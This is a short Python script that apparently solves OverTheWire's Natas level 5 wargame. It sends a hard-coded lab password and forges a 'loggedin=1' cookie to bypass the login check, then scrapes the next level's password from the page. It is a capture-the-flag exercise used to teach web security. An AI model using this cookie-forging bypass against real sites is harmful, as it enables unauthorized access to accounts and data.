import requests
import re

url = "http://natas5.natas.labs.overthewire.org"

set_cookie = {
    "loggedin": "1"
}

def exp():
    r = requests.get(url, auth=('natas5', '0n35PkggAPm2zbEpOU802c0x0Msn1ToK'), verify=False, cookies=set_cookie)
    if r.status_code == 200:
        password = re.findall('natas6 is (.+)', r.text)[0]
        if "</div>" in password:
            password = password.split("</div>")[0]
        print("Password for natas6: " + password)

if __name__ == "__main__":
    exp()